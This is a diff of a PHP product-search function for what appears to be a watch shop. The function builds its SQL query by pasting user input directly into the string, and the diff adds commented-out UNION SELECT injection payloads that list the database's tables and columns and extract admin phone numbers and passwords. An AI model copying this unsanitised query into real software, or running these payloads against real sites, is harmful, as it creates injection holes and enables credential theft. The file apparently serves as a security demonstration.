@@ -76,16 +76,29 @@
         }
 
         public function SearchSp($detail){
-            $query = "SELECT * FROM sanpham
+    
+
+            
+            // $Ma1 = "'UNION SELECT 1,TABLE_NAME from information_schema.tables#'";
+            
+            // $Ma2 = "'UNION SELECT 1,TABLE_NAME,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables#'";
+
+            // $Ma3 = "'UNION SELECT 1,COLUMN_NAME,2,3,4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.columns WHERE TABLE_NAME = 'admin'#'";
+
+            // $Ma4 = "'UNION SELECT 0,phonenumber,passwd,2,3,4,5,6,7,8,9,10,11,12,13,14 from admin#";
+
+
+
+            $query = "SELECT * FROM sanpham 
             WHERE brand LIKE \"%$detail%\"
-            OR name LIKE \"%$detail%\"
-            OR typeSearch LIKE \"%$detail%\"
-            OR watch_chainSearch LIKE \"%$detail%\"
-            OR glass_type LIKE \"%$detail%\"
-            OR colorSearch LIKE \"%$detail%\"
-            OR shapeSearch LIKE \"%$detail%\"
-            OR mo_ta LIKE \"%$detail%\"
-            ";
+              OR name LIKE \"%$detail%\"
+              OR typeSearch LIKE \"%$detail%\"
+              OR watch_chainSearch LIKE \"%$detail%\"
+              OR glass_type LIKE \"%$detail%\"
+              OR colorSearch LIKE \"%$detail%\"
+              OR shapeSearch LIKE \"%$detail%\"
+              OR mo_ta LIKE \"%$detail%\"
+              ";
             return mysqli_query($this->conn,$query);
         }
 
